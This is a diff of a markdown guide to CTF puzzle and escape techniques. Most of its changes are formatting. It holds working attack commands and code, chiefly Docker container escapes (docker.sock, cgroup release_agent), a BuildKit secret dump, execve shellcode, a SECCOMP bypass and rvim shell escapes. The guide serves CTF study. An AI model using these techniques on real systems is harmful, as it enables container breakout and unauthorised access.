@@ -1,7 +1,6 @@
 # CTF Misc - Games, VMs & Constraint Solving (Part 3)
 
 ## Table of Contents
-
 - [memfd_create Packed Binaries](#memfd_create-packed-binaries)
 - [Multi-Phase Interactive Crypto Game (EHAX 2026)](#multi-phase-interactive-crypto-game-ehax-2026)
 - [Emulator ROM-Switching State Preservation (BSidesSF 2026)](#emulator-rom-switching-state-preservation-bsidessf-2026)
@@ -31,7 +30,7 @@
 - [Shredded Document Pixel-Edge Reassembly Under Time Pressure (Nuit du Hack CTF 2018)](#shredded-document-pixel-edge-reassembly-under-time-pressure-nuit-du-hack-ctf-2018)
 - [References](#references)
 
-------
+---
 
 ## memfd_create Packed Binaries
 
@@ -44,20 +43,18 @@ open("dumped", "wb").write(decrypted)
 
 **Key insight:** Binaries using `memfd_create` execute payloads entirely in memory, leaving no file on disk. Intercept the decrypted payload before `fexecve` by hooking `memfd_create` or dumping `/proc/pid/fd/` entries, then analyze the dumped binary normally.
 
-------
+---
 
 ## Multi-Phase Interactive Crypto Game (EHAX 2026)
 
 **Pattern (The Architect's Gambit):** Server presents a multi-phase challenge combining cryptography, game theory, and commitment-reveal protocols.
 
 **Phase structure:**
-
 1. **Phase 1 (AES-ECB decryption):** Decrypt pile values with provided key. Determine winner from game state.
 2. **Phase 2 (AES-CBC with derived keys):** Keys derived via SHA-256 chain from Phase 1 results. Decrypt to get game parameters.
 3. **Phase 3 (Interactive gameplay):** Play optimal moves in a combinatorial game, bound by commitment-reveal protocol.
 
 **Commitment-reveal (HMAC binding):**
-
 ```python
 import hmac, hashlib
 
@@ -72,7 +69,6 @@ def compute_binding_token(session_nonce, answer):
 ```
 
 **GF(2^8) arithmetic for game drain calculations:**
-
 ```python
 # Galois Field GF(256) used in some game mechanics (Nim variants)
 # Nim-value XOR determines winning/losing positions
@@ -95,7 +91,6 @@ def gf256_mul(a, b, poly=0x11b):
 ```
 
 **Game tree memoization (C++ for performance):**
-
 ```python
 # Python too slow for large state spaces — use C++ with memoization
 # State compression: encode all pile sizes into single integer
@@ -116,26 +111,23 @@ def is_winning(state):
 ```
 
 **Key insights:**
-
 - Multi-phase challenges require solving each phase sequentially — each phase's output feeds the next
 - HMAC commitment-reveal prevents guessing; you must compute the correct answer
 - GF(256) Nim variants require Sprague-Grundy theory, not brute force
 - When Python recursion is too slow (>10s), rewrite game solver in C++ with state compression and memoization
 
-------
+---
 
 ## Emulator ROM-Switching State Preservation (BSidesSF 2026)
 
 **Pattern (wromwarp):** In emulator debuggers, the `/load` command may replace only the ROM program while preserving CPU state (registers, RAM, program counter). By switching between ROMs at specific PC values, you can execute arbitrary instruction sequences using instructions from different programs.
 
 **Key insight:** When a new ROM is loaded via the emulator's debug interface, the CPU state (registers, RAM, PC) remains unchanged. Only the program memory (ROM) is replaced. This means:
-
 - If ROM A has loaded secret data into RAM at certain addresses
 - And ROM B has a `display` instruction at the same PC where ROM A's execution paused
 - Loading ROM B at that point causes the CPU to execute ROM B's instruction (display) using ROM A's data (the secret)
 
 **Exploit workflow:**
-
 ```text
 1. Load ROM_A (contains INIT that loads secret into RAM)
 2. Step through ROM_A until secret data is in RAM
@@ -146,7 +138,6 @@ def is_winning(state):
 ```
 
 **Practical example:**
-
 ```python
 from pwn import *
 
@@ -168,21 +159,19 @@ print(f"Flag: {flag}")
 ```
 
 **When to recognize:**
-
 - Emulator/debugger challenge with `/load`, `/step`, `/run`, `/dump` commands
 - Multiple ROM files provided
 - One ROM initializes protected memory, another has display/output capabilities
 - Challenge mentions "ROM switching", "hot swap", or "state preservation"
 
 **Key lessons:**
-
 - Emulator debug interfaces that don't reset CPU state on ROM load create a state-mixing vulnerability
 - Combine instructions from different programs by loading them at the right PC values
 - Protected memory (read-only in one ROM's context) becomes accessible via another ROM's display instructions
 
 **References:** BSidesSF 2026 "wromwarp"
 
-------
+---
 
 ## Python Marshal Code Injection (iCTF 2013)
 
@@ -204,7 +193,7 @@ serialized = base64.b64encode(marshal.dumps(payload.__code__)).decode()
 
 **Key insight:** `marshal.loads()` is as dangerous as `pickle.loads()` — it deserializes arbitrary Python code objects. Unlike pickle, marshal is rarely sandboxed. The injected function runs with access to the server's `globals()`, enabling flag exfiltration via the socket connection.
 
-------
+---
 
 ## Benford's Law Frequency Distribution Bypass (iCTF 2013)
 
@@ -214,7 +203,7 @@ serialized = base64.b64encode(marshal.dumps(payload.__code__)).decode()
 import random
 
 # Benford's Law: P(d) = log10(1 + 1/d) for leading digit d (1-9)
-benford = {d: round(100 * (1 + 1/d) / sum(1/i for i in range(1,10))) for d in range(1,10)}
+import math; benford = {d: 100 * math.log10(1 + 1/d) for d in range(1, 10)}
 # Approx: 1→30%, 2→18%, 3→12%, 4→10%, 5→8%, 6→7%, 7→6%, 8→5%, 9→5%
 
 def generate_benford_compliant(length=1000):
@@ -227,7 +216,7 @@ def generate_benford_compliant(length=1000):
 
 **Key insight:** Benford's Law describes the frequency of leading digits in naturally occurring datasets. If a service validates digit distribution, generate compliant input rather than random numbers. Tolerance is typically +-5%, so approximate percentages work.
 
-------
+---
 
 ## Parallel Connection Oracle Relay (Hack.lu 2015)
 
@@ -267,7 +256,7 @@ for t in threads: t.start()
 
 **Key insight:** Works against any service where multiple connections share state (same PRNG seed from identical connection times). The sacrifice pattern ensures at least one connection survives all rounds.
 
-------
+---
 
 ## Nonogram Solver to QR Code Pipeline (SECCON 2015)
 
@@ -303,7 +292,7 @@ answer = qr.data
 
 **Key insight:** Nonogram solvers are available as command-line tools. The key challenge is parsing the web interface and converting output to a valid QR image. Add quiet zones (white border) around the QR for reliable decoding.
 
-------
+---
 
 ## 100 Prisoners Problem / Cycle-Following Strategy (Sharif CTF 2016)
 
@@ -332,7 +321,7 @@ def solve_prisoners(boxes):
 
 **Key insight:** Random strategy succeeds with probability (1/2)^N ≈ 0. Cycle-following succeeds with probability 1 - ln(2) ≈ 0.3069 for large N. The game fails only if any cycle exceeds length N/2. Pre-check cycle lengths if the box arrangement is known.
 
-------
+---
 
 ## C Code Jail Escape via Emoji Identifiers and Gadget Embedding (Midnight Flag 2026)
 
@@ -353,14 +342,14 @@ GCC allows emoji as identifiers. `(😃==😃)` is compile-time constant `1`. Bu
 
 At `-O0`, `var = var + CONSTANT` compiles to `05 XX XX XX XX` (add eax, imm32). Jump to offset+1 to execute the constant bytes as instructions:
 
-| Target bytes  | Instruction                | Constant (decimal) |
-| ------------- | -------------------------- | ------------------ |
-| `0f 05 c3`    | syscall; ret               | 12780815           |
-| `58 c3`       | pop rax; ret               | 50008              |
-| `5f c3`       | pop rdi; ret               | 50015              |
-| `5a c3`       | pop rdx; ret               | 50010              |
-| `5e c3`       | pop rsi; ret               | 50014              |
-| `54 5e 0f 05` | push rsp; pop rsi; syscall | 84893268           |
+| Target bytes | Instruction | Constant (decimal) |
+|---|---|---|
+| `0f 05 c3` | syscall; ret | 12780815 |
+| `58 c3` | pop rax; ret | 50008 |
+| `5f c3` | pop rdi; ret | 50015 |
+| `5a c3` | pop rdx; ret | 50010 |
+| `5e c3` | pop rsi; ret | 50014 |
+| `54 5e 0f 05` | push rsp; pop rsi; syscall | 84893268 |
 
 ```c
 // Each gadget function embeds one instruction sequence:
@@ -410,7 +399,7 @@ shellcode = asm(shellcraft.execve("/bin/sh", ["/bin/sh", "-c", "cat /flag*"]))
 
 **Compilation flags to watch for:** `-nostartfiles -nostdlib -static` indicates no libc, no CRT, deterministic layout — ideal for address-hardcoded exploits.
 
-------
+---
 
 ## BuildKit Daemon Exploitation for Build Secrets (BSidesSF 2026)
 
@@ -419,7 +408,6 @@ shellcode = asm(shellcraft.execve("/bin/sh", ["/bin/sh", "-c", "cat /flag*"]))
 **Attack (two-stage Dockerfile):**
 
 Stage 1 — Submit a Dockerfile that installs `buildctl` and triggers a nested build:
-
 ```dockerfile
 FROM moby/buildkit:v0.17.1-rootless
 COPY Dockerfile.exploit /tmp/Dockerfile
@@ -430,15 +418,12 @@ buildctl --addr tcp://127.0.0.1:1234 build \
   --opt filename=Dockerfile.exploit \
   --progress plain 2>&1; false
 EOF
-
 ```
 
 Stage 2 — The nested Dockerfile (`Dockerfile.exploit`) mounts and reads the secret:
-
 ```dockerfile
 FROM alpine
 RUN --mount=type=secret,id=flag cat /run/secrets/flag; false
-
 ```
 
 **Why `; false`:** Forces a non-zero exit code which causes BuildKit to dump the full build output (including the flag) to stderr. Without it, successful builds may suppress intermediate output.
@@ -446,11 +431,9 @@ RUN --mount=type=secret,id=flag cat /run/secrets/flag; false
 **Key insight:** BuildKit's gRPC API on localhost is unauthenticated by default. Any container running in the same network namespace can submit build requests. The `--mount=type=secret` mechanism is designed for build-time secrets but relies on the daemon being inaccessible — if the daemon is exposed, any build can request any secret.
 
 **Alternative approach:** If `buildctl` is unavailable, use the BuildKit gRPC API directly:
-
 ```python
 # buildctl du / buildctl debug workers  — enumerate available workers
 # buildctl build --progress=plain — trace build output
-
 ```
 
 **When to recognize:** Challenge provides a Dockerfile upload/build service. Look for BuildKit features (`--mount=type=secret`, `BUILDKIT_INLINE_CACHE`, `# syntax=` directives). Check if the build daemon is accessible from within built containers.
@@ -459,7 +442,7 @@ RUN --mount=type=secret,id=flag cat /run/secrets/flag; false
 
 **References:** BSidesSF 2026 "builds-as-a-service"
 
-------
+---
 
 ## Docker Container Escape Techniques
 
@@ -476,7 +459,6 @@ mkdir /mnt/host && mount /dev/sda1 /mnt/host
 chroot /mnt/host /bin/bash
 # Or via nsenter (requires PID 1 on host)
 nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
-
 ```
 
 ### Docker Socket Escape
@@ -493,7 +475,6 @@ curl -s --unix-socket /var/run/docker.sock \
   -X POST "http://localhost/containers/create" \
   -H "Content-Type: application/json" \
   -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
-
 ```
 
 ### Capability-Based Escape (CAP_SYS_ADMIN)
@@ -509,13 +490,11 @@ host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 echo '#!/bin/sh' > /cmd && echo 'cat /flag > /tmp/cgrp/x/flag' >> /cmd && chmod +x /cmd
 echo $$ > /tmp/cgrp/x/cgroup.procs  # Trigger release_agent
-
 ```
 
 ### Container Information Leakage
 
 Even without escape, containers leak host info:
-
 - `/proc/self/cgroup` -- container ID
 - `/proc/mounts` -- overlayfs `upperdir` reveals host path
 - `/sys/kernel/slab/*/cgroup/` -- other container IDs (cgroup debug info)
@@ -523,7 +502,7 @@ Even without escape, containers leak host info:
 
 **Key insight:** Check `--privileged` flag, mounted sockets (`docker.sock`), and capabilities (`capsh --print`) first. Privileged = instant escape. Socket = create new privileged container. CAP_SYS_ADMIN = cgroup release_agent. Without any of these, focus on information leakage and application-level escapes.
 
-------
+---
 
 ## 15-Puzzle Solvability as Bit Encoder (SharifCTF 8)
 
@@ -542,12 +521,11 @@ def is_solvable(grid):
 
 flag_bits = ''.join('1' if is_solvable(puzzle) else '0' for puzzle in puzzles)
 flag = bytes(int(flag_bits[i:i+8], 2) for i in range(0, len(flag_bits), 8))
-
 ```
 
 **Key insight:** The 15-puzzle has an invariant: exactly half of all permutations are solvable. A puzzle's solvability depends on the parity of inversions plus the blank tile's row from the bottom. This provides a natural 1-bit encoding per puzzle. When a challenge provides many puzzle instances with no obvious goal, check if solvability encodes binary data. The number of puzzles matching a multiple of 8 strongly suggests bit encoding.
 
-------
+---
 
 ## Taint Analysis Bypass in Custom Language via Type Coercion (PlaidCTF 2018)
 
@@ -569,12 +547,11 @@ let incr = (fn (bit : int) => (leaked := !leaked + bit) :> private unit)
            :> private (int -> private unit) in
 (if !secret < bit then ignore else incr) bit
 (* if returns private function type, but selected function modifies public ref *)
-
 ```
 
 **Key insight:** Information flow type systems often check secrecy labels at expression level, not data flow level. If the return type matches but the side effects differ, the type checker is satisfied while private data leaks through public mutable references. Two common bypasses: (1) if-condition secrecy not propagated to branches, (2) function type coercion hiding mutable side effects.
 
-------
+---
 
 ## Shredded Document Pixel-Edge Reassembly Under Time Pressure (Nuit du Hack CTF 2018)
 
@@ -600,15 +577,13 @@ def edge_distance(strip_a, strip_b):
     return bin(strip_a.trace_last ^ strip_b.trace_first).count('1')
 
 # Greedy placement: for each position, pick the strip with minimum edge distance
-
 ```
 
 **Key insight:** Shredded document strips share edge pixels at cut boundaries. Encode each strip's left and right edge as binary bitmasks (dark=1, light=0), then use XOR + popcount (Hamming distance) to find the best-matching adjacent strips. Greedy placement with edge distance metric reassembles the document in milliseconds.
 
-------
+---
 
 ## References
-
 - EHAX 2026 "The Architect's Gambit": Multi-phase AES + HMAC + GF(256) Nim
 - BSidesSF 2026 "wromwarp": Emulator ROM-switching state preservation
 - iCTF 2013: Python marshal code injection, Benford's Law bypass
@@ -622,7 +597,7 @@ def edge_distance(strip_a, strip_b):
 - PlaidCTF 2018: Taint analysis bypass via type coercion in custom language
 - Nuit du Hack CTF 2018: Shredded document pixel-edge reassembly
 
-------
+---
 
 ## Levenshtein Distance Oracle Attack (SunshineCTF 2016)
 
@@ -639,12 +614,11 @@ for c in string.printable:
     count = length - d  # Number of times c appears
     if count > 0:
         chars[c] = count
-
 ```
 
 **Key insight:** Edit distance as a side channel. Binary search locates character positions from Levenshtein feedback in O(n log n) queries.
 
-------
+---
 
 ## SECCOMP Bypass via High-Bit File Descriptor Trick (33C3 CTF 2016)
 
@@ -658,12 +632,11 @@ close(0x8000000000000002);  // SECCOMP sees fd != 2 (64-bit compare) -> ALLOW
 
 open("/proc/self/mem", O_WRONLY);  // returns fd 2 (lowest available)
 // Now write to /proc/self/mem via fd 2 to modify parent process memory
-
 ```
 
 **Key insight:** SECCOMP BPF operates on the raw 64-bit syscall argument, but the kernel's `close()` implementation casts to `int` (32-bit). Setting bit 63 changes the 64-bit value while preserving the 32-bit truncated result. This type/width mismatch between SECCOMP filter and kernel syscall handler is a general bypass pattern — check argument widths for any filtered syscall.
 
-------
+---
 
 ## rvim Jail Escape via Custom vimrc with Python3 Execution (BKP 2017)
 
@@ -681,12 +654,11 @@ sudo -u secretuser rvim -u /tmp/evil_vimrc /dev/null
 
 # Alternative: interactive escape once inside rvim
 :py3 import os; os.system("/bin/bash")
-
 ```
 
 **Key insight:** `rvim` restricts shell commands (`:!cmd`) but Python/Lua/Ruby interfaces remain available. The `:python3` or `:py3` command executes arbitrary Python code, including `os.system()`. If vim was compiled with `+python3`, this bypasses all shell restrictions. Check `:version` for `+python3`, `+lua`, or `+ruby` — any scripting interface escapes the jail.
 
-------
+---
 
 ## Restricted vim Escape via CTRL-W F and netrw File Browser (TokyoWesterns 2018)
 
@@ -702,16 +674,16 @@ Enter       — read selected file into a new buffer
 # If you need to run a command and `:` is banned, put the cursor on a keyword
 # such as `ls` and press K — vim opens the man page, then inside the man page
 # you can press `!` and get a shell prompt.
-
 ```
 
 **Key insight:** vim's restricted mode only covers `:`-based ex commands; normal-mode file-browser (`netrw`), manual-page lookup (`K`), and help (`<C-w>gF`) interfaces stay wide open. Any binary that enforces "restricted vim" via `:set modifiable`, disabled `:!`, or a blocked command-line is trivially bypassed by one of CTRL-W F, K, or gF. When auditing a vim sandbox, always test these three normal-mode primitives first.
 
 **References:** TokyoWesterns CTF 4th 2018 — vimshell, writeup 11269
 
-------
+---
 
 See [games-and-vms-4.md](games-and-vms-4.md) for 2018-era additions (XSLT VM, JS edge cases, timing oracles, OEIS, QR reassembly, math recurrences, CAPTCHA solvers, esolang polyglots, bytebeat).
+
 
 See also: [games-and-vms.md](games-and-vms.md) for WASM patching, Roblox place file reversing, PyInstaller extraction, marshal analysis, Python env RCE, Z3 constraint solving, K8s RBAC bypass, floating-point precision exploitation, and custom assembly language sandbox escape.
 
